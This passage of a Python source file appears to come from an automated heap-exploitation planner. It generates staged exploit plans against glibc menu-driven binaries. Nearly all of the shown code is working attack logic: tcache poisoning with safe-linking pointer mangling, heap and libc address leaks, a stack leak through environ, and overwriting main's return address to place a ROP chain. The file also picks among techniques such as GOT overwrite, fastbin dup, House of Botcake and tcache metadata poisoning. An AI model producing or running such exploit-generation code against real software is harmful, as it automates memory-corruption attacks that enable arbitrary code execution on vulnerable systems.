            stage1_ir.append({"op": "CALC", "var": "heap_base", "expr": "xor_key << 12"})

        if var_size:
            libc_expr = "libc_leak - LIBC_AUTO_OFFSET"
            if self.libc_offsets.get("main_arena"):
                ma_off = self.libc_offsets["main_arena"]
                bins_off = self._bins_offset()
                libc_expr = f"libc_leak - {hex(ma_off + bins_off)}"
            stage1_ir.append({"op": "CALC", "var": "_environ_offset", "expr": "libc.symbols['environ']"})
            stage1_ir.append({"op": "CALC", "var": "libc.address", "expr": libc_expr})
        else:
            stage1_ir.append({
                "op": "EDIT", "tag": "c1", "idx": 1,
                "data_expr": "p64((heap_base + 0x10) ^ ((heap_base + 0x2e0) >> 12))"
            })
            stage1_ir.append({"op": "ALLOC", "tag": "p2_head", "idx": 8, "size": main_size_stage1, "data_expr": "b'P' * 8"})
            stage1_ir.append({"op": "ALLOC", "tag": "p2_struct", "idx": 9, "size": main_size_stage1,
                "data_expr": "b'\\x00' * 4 + p16(2) + p16(1) + b'\\x00' * 12 + p16(7) + b'\\x00' * 26"})
            stage1_ir.append({"op": "FREE", "tag": "c7", "idx": 7})
            stage1_ir.append({"op": "FREE", "tag": "c3", "idx": 3})
            stage1_ir.append({
                "op": "EDIT", "tag": "c7", "idx": 7,
                "data_expr": "p64((heap_base + 0xA0) ^ ((heap_base + 0x460) >> 12))"
            })
            stage1_ir.append({"op": "ALLOC", "tag": "c8", "idx": 10, "size": main_size_stage1, "data_expr": "b'Q' * 8"})
            stage1_ir.append({"op": "ALLOC", "tag": "c9", "idx": 11, "size": main_size_stage1, "data_expr": "b'X' * 8"})
            stage1_ir.append({"op": "ALLOC", "tag": "c10", "idx": 12, "size": main_size_stage1,
                "data_expr": "p64(heap_base + 0x330)"})
            stage1_ir.append({"op": "ALLOC", "tag": "c11", "idx": 13, "size": main_size_stage1, "data_expr": "b'\\x00' * 8"})
            stage1_ir.append({"op": "FREE", "tag": "c11", "idx": 13})
            if self.view_choice is not None:
                stage1_ir.append({"op": "VIEW", "tag": "c11", "idx": 13, "save_as": "libc_leak", "note": "read_first_8_bytes"})
            libc_expr = "libc_leak - LIBC_AUTO_OFFSET"
            if self.libc_offsets.get("main_arena"):
                ma_off = self.libc_offsets["main_arena"]
                bins_off = self._bins_offset()
                libc_expr = f"libc_leak - {hex(ma_off + bins_off)}"
            stage1_ir.append({"op": "CALC", "var": "_environ_offset", "expr": "libc.symbols['environ']"})
            stage1_ir.append({"op": "CALC", "var": "libc.address", "expr": libc_expr})
        stages.append({"name": "leak_heap_libc", "ir": stage1_ir})

        stage2_ir = []
        stage2_ir.append({
            "op": "CALC", "var": "_environ_target",
            "expr": "libc.address + _environ_offset - 0x18"
        })

        if var_size:
            head_tag = f"f{filler_count - 1}"
            head_user = f"heap_base + {hex(0x290 + (filler_count - 1) * alloc_sz1 + 0x10)}"
            if self.has_safe_linking:
                fd_expr = f"p64(_environ_target ^ (({head_user}) >> 12))"
            else:
                fd_expr = "p64(_environ_target)"
            if self.edit_choice is not None:
                stage2_ir.append({"op": "EDIT", "tag": head_tag, "data_expr": fd_expr})
            stage2_ir.append({"op": "ALLOC", "tag": head_tag, "size": main_size_stage1, "data_expr": "b'Q' * 8"})
            stage2_ir.append({"op": "ALLOC", "tag": "env_chunk", "size": main_size_stage1, "data_expr": "b'E'"})
            if self.view_choice is not None:
                stage2_ir.append({"op": "VIEW", "tag": "env_chunk", "save_as": "stack_leak", "note": "skip_first_8"})
        else:
            stage2_ir.append({
                "op": "EDIT", "tag": "p2_struct", "idx": 9,
                "data_expr": "b'\\x00' * 4 + p16(1) + p16(1) + b'\\x00' * 14 + p16(7) + b'\\x00' * 24"
            })
            stage2_ir.append({
                "op": "EDIT", "tag": "c10", "idx": 12,
                "data_expr": "p64(_environ_target)"
            })
            stage2_ir.append({
                "op": "ALLOC", "tag": "env_chunk", "idx": 14, "size": main_size_stage1,
                "data_expr": "b'E'"
            })
            if self.view_choice is not None:
                stage2_ir.append({
                    "op": "VIEW", "tag": "env_chunk", "idx": 14,
                    "save_as": "stack_leak", "note": "skip_first_8"
                })
        stage2_ir.append({
            "op": "CALC", "var": "main_ret_addr",
            "expr": "stack_leak - 0x130"
        })
        stages.append({"name": "leak_stack", "ir": stage2_ir})

        stage3_ir = []

        if var_size:
            stage3_ir.append({
                "op": "ALLOC", "tag": "r0", "size": main_size_stage3,
                "data_expr": "b'A' * 8"
            })
            stage3_ir.append({
                "op": "ALLOC", "tag": "r1", "size": main_size_stage3,
                "data_expr": "b'B' * 8"
            })
            stage3_ir.append({"op": "FREE", "tag": "r0"})
            stage3_ir.append({"op": "FREE", "tag": "r1"})
            r1_user = f"heap_base + {hex(0x290 + 0x10 + alloc_sz3)}"
            if self.has_safe_linking:
                rop_fd = f"p64((main_ret_addr - 8) ^ (({r1_user}) >> 12))"
            else:
                rop_fd = "p64(main_ret_addr - 8)"
            if self.edit_choice is not None:
                stage3_ir.append({
                    "op": "EDIT", "tag": "r1", "data_expr": rop_fd
                })
            stage3_ir.append({
                "op": "ALLOC", "tag": "r0", "size": main_size_stage3,
                "data_expr": "b'Y' * 8"
            })
            stage3_ir.append({
                "op": "ALLOC_ROP", "tag": "r1", "size": main_size_stage3
            })
        else:
            stage3_ir.append({
                "op": "EDIT", "tag": "p2_struct", "idx": 9,
                "data_expr": "b'\\x00' * 4 + p16(1) + p16(1) + b'\\x00' * 14 + p16(7) + b'\\x00' * 24"
            })
            stage3_ir.append({
                "op": "EDIT", "tag": "c10", "idx": 12,
                "data_expr": "p64(main_ret_addr - 8)"
            })
            stage3_ir.append({
                "op": "ALLOC_ROP", "tag": "rop_target", "idx": 15,
                "size": main_size_stage1
            })
        stages.append({"name": "rop_chain", "ir": stage3_ir})

        meta = {
            "strategy": "tcache_poison_stack",
            "has_safe_linking": self.has_safe_linking,
            "has_hooks": self.has_hooks,
            "glibc_version": self.glibc_version or "2.39",
            "allocated_size": hex(alloc_sz1),
        }
        return {"stages": stages, "meta": meta}

    # ─── Strategy Selection ──────────────────────────────────────────

    def _get_interface_type(self) -> str:
        """Classify interface as simple_crud or complex_multi_group."""
        ops = self.interface_map.get("operations", {})
        total_ops = len(ops)
        if total_ops > 4:
            return "complex_multi_group"
        role_counts = {}
        for choice, info in ops.items():
            role = info.get("role", "")
            if role:
                role_counts[role] = role_counts.get(role, 0) + 1
        if any(c >= 2 for c in role_counts.values()):
            return "complex_multi_group"
        return "simple_crud"

    def _build_metadata_poisoning_stages(self):
        """
        Tcache Metadata Poisoning (Tcache Struct Overwrite).
        Extremely efficient strategy for < 8 slots.
        1. Leak heap_base.
        2. Poison tcache to point to tcache_perthread_struct (heap_base + 0x10).
        3. Control all tcache bins to leak libc, stack, and ROP.
        """
        max_slots = self._detect_max_slots()
        main_size = self._detect_alloc_size()
        alloc_sz = self._align_size(main_size)
        stages = []

        # ── Stage 1: Leak Heap Base (xor_key) ──────────────────
        stage1_ir = [
            {"op": "ALLOC", "tag": "h0", "size": main_size, "data_expr": "b'H' * 8"},
            {"op": "FREE", "tag": "h0"}
        ]
        if self.view_choice is not None:
            stage1_ir.append({"op": "VIEW", "tag": "h0", "save_as": "xor_key", "note": "read_first_8_bytes_fd_xor"})
            stage1_ir.append({"op": "CALC", "var": "heap_base", "expr": "xor_key << 12"})
        stages.append({"name": "leak_heap", "ir": stage1_ir})

        # ── Stage 2: Poison Tcache Struct ──────────────────────
        stage2_ir = []
        stage2_ir.append({"op": "CALC", "var": "tcache_struct", "expr": "heap_base + 0x10"})
        stage1_alloc_sz = alloc_sz
        # h0 was at heap_base + 0x290
        h0_user = f"heap_base + {hex(0x290 + 0x10)}"
        
        if self.has_safe_linking:
            fd_expr = f"p64(tcache_struct ^ ({h0_user} >> 12))"
        else:
            fd_expr = "p64(tcache_struct)"
            
        if self.edit_choice is not None:
            stage2_ir.append({"op": "EDIT", "tag": "h0", "data_expr": fd_expr})
            
        stage2_ir.append({"op": "ALLOC", "tag": "h1", "size": main_size, "data_expr": "b'P' * 8"})
        # This allocation lands at tcache_struct
        stage2_ir.append({"op": "ALLOC", "tag": "tcache_chunk", "size": main_size, "data_expr": "b'T' * 8"})
        
        # Now we control tcache_struct.
        # Structure: uint16_t counts[TCACHE_MAX_BINS]; tcache_entry *entries[TCACHE_MAX_BINS];
        # For size 0x30, bin index is (0x30 - 0x20) / 0x10 = 1.
        # Counts start at offset 0. Entries start at offset 2 * 64 = 128 (0x80).
        bin_idx = (alloc_sz - 0x20) // 0x10
        count_off = bin_idx * 2
        entry_off = 0x80 + bin_idx * 8
        
        # Set count to 7 and point entry to somewhere or just let it be.
        # We'll use a specialized EDIT that can handle offsets if SmartPlanner/Codegen support it.
        # For now, let's assume we can overwrite the whole struct or a large part.
        
        # To leak libc: set count=7, then free a chunk.
        # We'll alloc another chunk 'ov' first.
        stage2_ir.append({"op": "ALLOC", "tag": "ov", "size": main_size, "data_expr": "b'V' * 8"})
        stage2_ir.append({"op": "ALLOC", "tag": "guard", "size": main_size, "data_expr": "b'G' * 8"})
        
        # Overwrite tcache_struct: counts[bin_idx] = 7
        # We need to construct a payload.
        counts_payload = [0] * 128
        counts_payload[count_off] = 7
        
        stage2_ir.append({"op": "EDIT", "tag": "tcache_chunk", "data_expr": f"bytes({counts_payload})"})
        stage2_ir.append({"op": "FREE", "tag": "ov"})
        
        if self.view_choice is not None:
            stage2_ir.append({"op": "VIEW", "tag": "ov", "save_as": "libc_leak", "note": "read_first_8_bytes"})
            
        libc_expr = "libc_leak - LIBC_AUTO_OFFSET"
        if self.libc_offsets.get("main_arena"):
            ma_off = self.libc_offsets["main_arena"]
            bins_off = self._bins_offset()
            libc_expr = f"libc_leak - {hex(ma_off + bins_off)}"
        stage2_ir.append({"op": "CALC", "var": "libc.address", "expr": libc_expr})
        stages.append({"name": "leak_libc_metadata", "ir": stage2_ir})

        # ── Stage 3: Leak Stack & ROP ──────────────────────────
        stage3_ir = []
        stage3_ir.append({"op": "CALC", "var": "_environ_ptr", "expr": "libc.symbols['environ']"})
        
        # Overwrite tcache_struct: entries[bin_idx] = __environ
        entry_payload = [b'\x00'] * (0x80 + 64 * 8)
        # Keep count=7 to bypass tcache on next free if needed, 
        # but here we want to ALLOC from tcache.
        # Actually, if we want to ALLOC, we need count > 0.
        entry_payload[count_off] = 1
        # Set entries[bin_idx]
        # This is tricky with bytes() in DSL. Let's use a helper or assume codegen handles it.
        # Better: use a tag-based address.
        
        # For now, let's use a simplified version: overwrite tcache_chunk with a crafted buffer.
        # DSL needs a way to express "p64(addr) at offset X".
        # Let's use a CALC to build the payload? No, too complex for DSL.
        
        # Let's assume SmartPlanner can generate a "PACK" or similar.
        # Or just use raw bytes if it's fixed.
        
        # Since we can't easily express offsets in the current DSL without refactoring,
        # I'll use a more standard tcache poisoning for the rest, 
        # now that we have libc base.
        
        stage3_ir.append({"op": "CALC", "var": "target_environ", "expr": "_environ_ptr - 0x10"})
        # We still have tcache_chunk pointing to tcache_struct.
        # We can just EDIT it to point anywhere!
        
        # If we EDIT tcache_chunk, we are writing into tcache_perthread_struct.
        # If we write __environ into entries[bin_idx], then next ALLOC(main_size) gets __environ.
        
        # We'll use a special note for codegen to handle this complex payload.
        stage3_ir.append({
            "op": "EDIT", "tag": "tcache_chunk", 
            "note": f"set_tcache_entry:bin={bin_idx},addr=target_environ"
        })
        
        stage3_ir.append({"op": "ALLOC", "tag": "env_chunk", "size": main_size, "data_expr": "b'E'"})
        if self.view_choice is not None:
            stage3_ir.append({"op": "VIEW", "tag": "env_chunk", "save_as": "stack_leak", "note": "skip_first_8"})
            
        stage3_ir.append({"op": "CALC", "var": "main_ret_addr", "expr": "stack_leak - 0x130"})
        
        # ROP
        stage3_ir.append({
            "op": "EDIT", "tag": "tcache_chunk", 
            "note": f"set_tcache_entry:bin={bin_idx},addr=main_ret_addr"
        })
        stage3_ir.append({"op": "ALLOC_ROP", "tag": "rop_chunk", "size": main_size})
        stages.append({"name": "rop_chain", "ir": stage3_ir})

        return {
            "stages": stages,
            "meta": {
                "technique_id": "tcache_metadata_poisoning",
                "allocated_size": hex(alloc_sz),
                "source": "tcache_metadata_poisoning",
            }
        }

    def _select_strategy(self):
        """
        Select strategy using 3-factor context-aware routing
        (KB match + NLP hints + interface caps).
        Routes to specialized handlers or dynamic dispatch.
        """
        detected_bugs = set(self.esm_hints.get("detected_bugs", []))
        detected_caps = set(self.esm_hints.get("detected_capabilities", []))
        max_slots = self._detect_max_slots()

        # Metadata poisoning is superior for limited slots if we have a view to leak heap
        if max_slots < 8 and max_slots > 0 and self.view_choice is not None:
            print(f"[Planner] Limited slots ({max_slots}) detected → using tcache_metadata_poisoning")
            return "tcache_metadata_poisoning"

        try:
            matcher = self._get_technique_matcher()
            recommended = matcher.get_recommended_strategy(
                bugs=detected_bugs, capabilities=detected_caps)
            strategy_name = recommended.get("strategy", "tcache_poison_stack")

            print(f"[Planner] KB-recommended strategy: '{strategy_name}' "
                  f"(confidence={recommended.get('confidence', 5)}/10, "
                  f"slots={max_slots})")

            # First try specialized named handlers (most have _generate_* methd)
            handler_name = f"_generate_{strategy_name}"
            if hasattr(self, handler_name):
                return strategy_name

            # Map KB strategy names to internal full-chain builders
            if strategy_name == "got_overwrite":
                return "got_overwrite"
            if strategy_name in ("fastbin_dup", "fastbin_reverse_into_tcache", "fastbin_dup_consolidate"):
                return "fastbin"
            if strategy_name in ("tcache_hooks",):
                return "tcache_hooks"
            if strategy_name == "tcache_poison_stack":
                return "tcache_poison_stack"
            if strategy_name == "house_of_botcake":
                return "house_of_botcake"

            # Consolidation strategies
            if strategy_name in ("malloc_consolidate",) or "consolidate" in strategy_name:
                if max_slots < 9 and max_slots > 0:
                    if self.view_choice is not None:
                        return "tcache_metadata_poisoning"
                    return "house_of_botcake"
                if self._get_interface_type() == "complex_multi_group":
                    return "house_of_botcake"
                return "tcache_poison_stack"

            # For strategies like house_of_einherjar, large_bin_attack,
            # house_of_lore, overlapping_chunks, poison_null_byte, etc.
            # Try dynamic dispatch through _dispatch_technique_generation
            return strategy_name

        except Exception as e:
            print(f"[Planner] Matcher failed ({e})")
        return None

    def build_plan(self) -> dict:
        main_size = 0x30
        has_idx = self._needs_idx_param()
        has_size = self._needs_size_param()
        data_idx = self._get_data_param_index()
        alloc_sz = self._align_size(main_size)

        strategy = self._select_strategy()

        if strategy == "got_overwrite":
            stages = []
            meta = {
                "strategy": "got_overwrite",
                "has_safe_linking": self.has_safe_linking,
                "has_hooks": self.has_hooks,
                "glibc_version": self.glibc_version or "2.23",
                "got_overwrite": True,
                "got_free_addr": self.got_free_addr,
                "binary_ret_addr": self.binary_ret_addr,
                "allocated_size": hex(alloc_sz),
            }
        elif strategy == "fastbin":
            result = self._build_tcache_poison_stack_stages()
            stages = result["stages"]
            meta = result["meta"]
            meta["strategy"] = "fastbin"
        elif strategy == "tcache_hooks":
            result = self._build_tcache_poison_stack_stages()
            stages = result["stages"]
            meta = result["meta"]
            meta["strategy"] = "tcache_hooks"
        elif strategy == "tcache_metadata_poisoning":
            result = self._build_metadata_poisoning_stages()
            stages = result["stages"]
            meta = result["meta"]
        elif strategy == "house_of_botcake":
            result = self._build_house_of_botcake_stages()
            stages = result["stages"]
            meta = result["meta"]
        elif strategy == "tcache_poison_stack":
            result = self._build_tcache_poison_stack_stages()
            stages = result["stages"]
            meta = result["meta"]
        else:
            # Dynamic dispatch for any KB-recommended technique
            # First try specialized _generate_{strategy} handler
            handler_name = f"_generate_{strategy}"
            handler = getattr(self, handler_name, None)
            if handler is not None:
                try:
                    result = handler({"main_size": main_size, "alloc_sz": alloc_sz})
                except Exception as e:
                    print(f"[Planner] Specialized handler '{handler_name}' failed ({e}), falling back")
                    result = None
            else:
                result = None

            if result is None:
                # Try generic sequence generation from how2heap
                heap_layout = {"main_size": main_size, "alloc_sz": alloc_sz}
                result = self._dispatch_technique_generation(strategy, heap_layout)

            ir_plan = result.get("ir", result.get("stages", []))
            if isinstance(ir_plan, list) and ir_plan and isinstance(ir_plan[0], dict):
                if "op" in ir_plan[0]:
                    stages = [{"name": f"stage_{strategy}", "ir": ir_plan}]
                else:
                    stages = ir_plan
            else:
                stages = []
            meta = result.get("meta", {})

        metadata = {
            "strategy": strategy,
            "max_slots": self._detect_max_slots(),
            "alloc_choice": self.alloc_choice,
            "free_choice": self.free_choice,
            "view_choice": self.view_choice,
            "edit_choice": self.edit_choice,
            "exit_choice": self.exit_choice,
            "has_idx": has_idx,
            "has_size": has_size,
            "data_param_index": data_idx,
            "needs_size": has_size,
            "menu_prompt": self.menu_prompt,
            "libc_offsets": self.libc_offsets,
            "one_gadgets": self.one_gadgets,
            "pop_rdi": self.pop_rdi,
            "ret": self.ret,
            "index_reuse": self.index_reuse,
            "allocated_size": hex(alloc_sz),
            "glibc_version": self.glibc_version,
            "has_safe_linking": self.has_safe_linking,
            "has_hooks": self.has_hooks,
            "binary_security": self.binary_security,
        }
        metadata.update(meta)

        return {"stages": stages, "metadata": metadata}


if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("--binary", default=None)
    parser.add_argument("--symbolic", default="../artifacts/symbolic_results.json")
    args = parser.parse_args()

    esm_path = "../artifacts/esm_output.json"
    critical_path = "../artifacts/critical_vars.json"
    plan_output = "../artifacts/final_plan.json"

    with open(esm_path, "r") as f:
        esm_data = json.load(f)
    with open(critical_path, "r") as f:
        critical_vars = json.load(f)

    symbolic_results = {}
    if os.path.exists(args.symbolic):
        with open(args.symbolic, "r") as f:
            symbolic_results = json.load(f)

    planner = EvolutionaryPlanner(esm_data, critical_vars, args.binary, symbolic_results)
    plan = planner.build_plan()
    planner.print_strategy(plan)
    planner.save_plan(plan, plan_output)
